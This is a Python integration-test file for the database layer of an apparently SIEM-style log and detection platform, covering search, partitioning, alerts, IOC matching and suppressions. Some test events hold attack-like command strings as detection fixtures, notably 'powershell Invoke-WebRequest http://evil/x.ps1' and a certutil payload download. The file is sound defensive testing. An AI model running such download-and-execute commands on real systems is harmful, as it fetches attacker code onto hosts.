"""Real-PostgreSQL integration tests for the data layer.

These exercise what the DB-free unit tests cannot: month partitioning and its
auto-creation, the GIN full-text index, inet/CIDR search, ON CONFLICT dedup,
retention purge dropping whole partitions, the correlation SQL, alert
insert/dedup/queries, the pipeline write path, and the auth/collector/registry
round-trips. They run only when DB_DSN is set (see tests/conftest.py).
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from app.detection import engine as de
from app.detection import runtime as rt
from app.models import NormalizedEvent

pytestmark = pytest.mark.integration

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"
_T0 = datetime(2026, 6, 1, 12, 0, tzinfo=timezone.utc)


def _evt(**kw) -> NormalizedEvent:
    kw.setdefault("event_time", _T0)
    kw.setdefault("vendor", "testvendor")
    kw.setdefault("raw", {"k": "v"})
    return NormalizedEvent(**kw)


def _store(db, events, batch_id: int = 1) -> None:
    with db.pool().connection() as conn:
        db.insert_events(conn, events, batch_id)
        conn.commit()


def _partitions(db) -> set[str]:
    with db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT c.relname AS name FROM pg_inherits i "
            "JOIN pg_class c ON c.oid = i.inhrelid "
            "WHERE i.inhparent = 'events'::regclass").fetchall()
    return {r["name"] for r in rows}


# --------------------------------------------------------------------------- #
#  Schema, partitioning, search/FTS, dedup, purge                             #
# --------------------------------------------------------------------------- #
def test_schema_has_core_tables(clean_db):
    with clean_db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema = 'public'").fetchall()
    names = {r["table_name"] for r in rows}
    assert {"events", "alerts", "ingest_batches", "detection_rules", "api_keys",
            "users", "sessions", "audit_log", "collectors",
            "response_actions"} <= names


def test_event_insert_search_fts_and_cidr(clean_db):
    db = clean_db
    _store(db, [
        _evt(vendor="paloalto", action="allow", src_ip="10.1.2.3", dst_ip="8.8.8.8",
             message="certutil download payload.exe"),
        _evt(vendor="cisco", action="deny", src_ip="203.0.113.9",
             message="connection blocked"),
    ])
    rows, total = db.search({"vendor": "paloalto"}, 50, 0)
    assert total == 1 and rows[0]["src_ip"] == "10.1.2.3"      # host(inet) rendered
    assert db.search({"q": "certutil"}, 50, 0)[1] == 1          # GIN full-text index
    assert db.search({"src_ip": "10.0.0.0/8"}, 50, 0)[1] == 1   # inet CIDR containment
    assert db.search({"src_ip": "10.0.0.0/8"}, 50, 0)[0][0]["src_ip"] == "10.1.2.3"
    assert db.search({"action": "deny"}, 50, 0)[1] == 1


def test_dedup_on_conflict(clean_db):
    db = clean_db
    _store(db, [_evt(vendor="dup", message="same")])
    _store(db, [_evt(vendor="dup", message="same")])           # identical identity
    assert db.search({"vendor": "dup"}, 50, 0)[1] == 1
    assert db.count_batch_rows(1) == 1


def test_monthly_partitions_autocreated(clean_db):
    db = clean_db
    _store(db, [
        _evt(event_time=datetime(2026, 1, 15, tzinfo=timezone.utc), vendor="jan"),
        _evt(event_time=datetime(2026, 3, 20, tzinfo=timezone.utc), vendor="mar"),
    ])
    parts = _partitions(db)
    assert "events_202601" in parts and "events_202603" in parts
    # the rows landed in the dedicated month partitions, not events_default
    with db.pool().connection() as conn:
        n_default = conn.execute("SELECT count(*) AS n FROM events_default").fetchone()["n"]
    assert n_default == 0


def test_purge_drops_old_partitions(clean_db):
    db = clean_db
    _store(db, [_evt(event_time=datetime(2020, 1, 10, tzinfo=timezone.utc), vendor="old"),
                _evt(vendor="recent")])
    assert "events_202001" in _partitions(db)
    dropped = db.purge_older_than(1)                            # cutoff ≈ 1 year ago
    assert "events_202001" in dropped
    assert "events_202001" not in _partitions(db)
    assert db.search({"vendor": "old"}, 50, 0)[1] == 0
    assert db.search({"vendor": "recent"}, 50, 0)[1] == 1      # current month untouched


# --------------------------------------------------------------------------- #
#  Correlation SQL                                                             #
# --------------------------------------------------------------------------- #
def test_correlation_threshold(clean_db):
    db = clean_db
    base = datetime.now(timezone.utc) - timedelta(minutes=1)
    _store(db, [_evt(event_time=base + timedelta(seconds=i), vendor="fw",
                     action="failed-logon", src_ip="45.1.2.3", message=f"fail {i}")
                for i in range(5)])
    groups = db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 5)
    assert groups and groups[0]["src_ip"] == "45.1.2.3" and groups[0]["n"] >= 5
    assert db.correlate({"action": "failed-logon"}, ["src_ip"], 3600, 6) == []   # under threshold
    assert db.correlate({"action": "failed-logon"}, ["src_ip"], 1, 5) == []      # outside window


# --------------------------------------------------------------------------- #
#  Pipeline write path + alerts                                               #
# --------------------------------------------------------------------------- #
def test_pipeline_writes_events_and_alerts(clean_db):
    db = clean_db
    from app import pipeline
    rt.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn,
                [_evt(vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")],
                batch_id=1)
            conn.commit()
    finally:
        rt.set_engine(None)
    assert res.total == 1
    assert db.count_batch_rows(1) == 1
    alerts, total = db.recent_alerts({}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in alerts)


def test_alerts_insert_dedup_and_queries(clean_db):
    db = clean_db
    rule = next(r for r in de.load_rules(RULES_DIR) if r.id == "lo-rdp-allowed")
    evt = _evt(vendor="paloalto", src_ip="9.9.9.9", action="allow", dst_port=3389,
               message="rdp session")
    alert = de.alert_from_match(rule, evt, dedup_hash="dh-1", batch_id=1)

    with db.pool().connection() as conn:
        new = db.insert_alerts(conn, [alert], return_inserted=True)
        conn.commit()
    assert len(new) == 1 and new[0]["id"]
    with db.pool().connection() as conn:                       # re-insert => deduped
        again = db.insert_alerts(conn, [alert], return_inserted=True)
        conn.commit()
    assert again == []

    rows, total = db.recent_alerts({"level": "medium"}, 50, 0)
    assert total == 1 and rows[0]["rule_id"] == "lo-rdp-allowed"
    assert db.alert_severity_counts().get("medium") == 1
    assert db.alert_technique_counts(30).get("T1021.001") == 1

    db.set_alert_status(new[0]["id"], "closed")
    assert "medium" not in db.alert_severity_counts()          # only open alerts counted


# --------------------------------------------------------------------------- #
#  Registry, API keys, users/sessions/audit, collectors                       #
# --------------------------------------------------------------------------- #
def test_rule_registry_sync_and_toggle(clean_db):
    db = clean_db
    db.sync_rules(de.load_rules(RULES_DIR))
    assert "lo-rdp-allowed" in db.enabled_rule_ids()
    db.set_rule_enabled("lo-rdp-allowed", False)
    assert "lo-rdp-allowed" not in db.enabled_rule_ids()
    listed = db.list_rules()
    assert any(r["rule_id"] == "lo-rdp-allowed" for r in listed)
    assert all("fired" in r for r in listed)                   # alert-count join column


def test_api_keys_roundtrip(clean_db):
    db = clean_db
    rec = db.create_api_key("ci", "scanner")
    assert rec["key"].startswith("lo_")
    assert db.verify_api_key(rec["key"])["name"] == "ci"
    assert db.verify_api_key("lo_bogus") is None
    db.set_api_key_enabled(rec["id"], False)
    assert db.verify_api_key(rec["key"]) is None               # disabled key rejected
    assert any(k["name"] == "ci" for k in db.list_api_keys())


def test_users_sessions_audit_roundtrip(clean_db):
    db = clean_db
    assert db.count_users() == 0
    uid = db.create_user("alice", "pbkdf2$hash", "admin")
    assert db.get_user_by_name("alice")["role"] == "admin"

    now = datetime.now(timezone.utc)
    db.create_session("tok-live", uid, now + timedelta(hours=1))
    assert db.get_session_user("tok-live")["username"] == "alice"
    db.create_session("tok-expired", uid, now - timedelta(hours=1))
    assert db.get_session_user("tok-expired") is None          # expired
    db.delete_session("tok-live")
    assert db.get_session_user("tok-live") is None

    db.set_user_enabled(uid, False)
    db.create_session("tok-disabled", uid, now + timedelta(hours=1))
    assert db.get_session_user("tok-disabled") is None         # disabled user

    db.add_audit("alice", "login", "ok", "127.0.0.1")
    assert db.recent_audit(10)[0]["action"] == "login"


def test_collectors_roundtrip(clean_db):
    db = clean_db
    db.sync_collectors(["okta", "github"])
    assert db.get_collector("okta")["enabled"] is True
    db.update_collector("okta", cursor="C1", last_status="ok", last_count=5)
    okta = db.get_collector("okta")
    assert okta["cursor"] == "C1" and okta["last_count"] == 5 and okta["last_run"] is not None
    assert db.enabled_collector_names() == {"okta", "github"}
    db.set_collector_enabled("github", False)
    assert db.enabled_collector_names() == {"okta"}
    assert len(db.list_collectors()) == 2


def test_iocs_roundtrip_and_pipeline_alert(clean_db):
    db = clean_db
    from app import pipeline
    from app.threatintel import matcher as tim
    from app.threatintel import runtime as tirt

    db.upsert_iocs([tim.make_ioc("203.0.113.5", "feedX", "critical"),
                    tim.make_ioc("evil.test", "feedX")])
    assert db.ioc_counts()["total"] == 2
    assert {r["indicator"] for r in db.enabled_iocs()} == {"203.0.113.5", "evil.test"}

    # re-syncing a feed replaces only that source's indicators
    db.replace_source_iocs("feedX", [tim.make_ioc("198.51.100.9", "feedX")])
    counts = db.ioc_counts()
    assert counts["total"] == 1 and counts["ip"] == 1

    tirt.reload_index()                       # build the in-memory index from the DB
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn, [_evt(vendor="fw", src_ip="198.51.100.9", message="inbound")],
                batch_id=1)
            conn.commit()
    finally:
        tirt.set_index(tim.IocIndex())        # reset the global index for other tests
    assert res.total == 1
    alerts, _ = db.recent_alerts({}, 50, 0)
    ti = next(a for a in alerts if a["rule_id"] == "ti-ioc-match")
    assert ti["level"] == "high" and "198.51.100.9" in ti["message"]

    db.delete_ioc("198.51.100.9", "ip")
    assert db.ioc_counts()["total"] == 0


def test_suppression_pipeline_assignee_and_notes(clean_db):
    db = clean_db
    from app import pipeline
    from app.triage import runtime as suprt, suppression as supm

    rt.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
    sid = db.create_suppression("test", rule_id="lo-ingress-tool-transfer",
                                src_ip="203.0.113.9")
    suprt.reload_index()
    try:
        with db.pool().connection() as conn:
            res = pipeline.write_stream(
                conn, [_evt(vendor="x", src_ip="203.0.113.9",
                            message="powershell Invoke-WebRequest http://evil/x.ps1")],
                batch_id=1)
            conn.commit()
    finally:
        rt.set_engine(None)
        suprt.set_index(supm.SuppressionIndex())

    assert res.alerts == []                                  # suppressed -> not dispatched
    suppressed, _ = db.recent_alerts({"status": "suppressed"}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in suppressed)
    default, _ = db.recent_alerts({}, 50, 0)                 # default view hides suppressed
    assert all(a["status"] != "suppressed" for a in default)
    assert next(s for s in db.list_suppressions() if s["id"] == sid)["hit_count"] >= 1

    aid = suppressed[0]["id"]
    db.set_alert_assignee(aid, "alice")
    assert db.get_alert(aid)["assignee"] == "alice"
    db.add_alert_note(aid, "alice", "reviewed — known admin tooling")
    notes = db.alert_notes(aid)
    assert len(notes) == 1 and notes[0]["author"] == "alice"

    db.delete_suppression(sid)
    assert db.list_suppressions() == []


def test_batch_lifecycle_and_sha_lookup(clean_db):
    db = clean_db
    bid = db.create_batch("fw.log", "sha-abc", "paloalto", "paloalto_csv")
    _store(db, [_evt(vendor="paloalto", message="a"),
                _evt(vendor="paloalto", message="b")], batch_id=bid)
    db.update_batch(bid, status="done", total_rows=2, inserted_rows=2)
    assert db.count_batch_rows(bid) == 2
    assert db.find_batch_by_sha("sha-abc")["id"] == bid
    assert db.recent_batches(10)[0]["id"] == bid
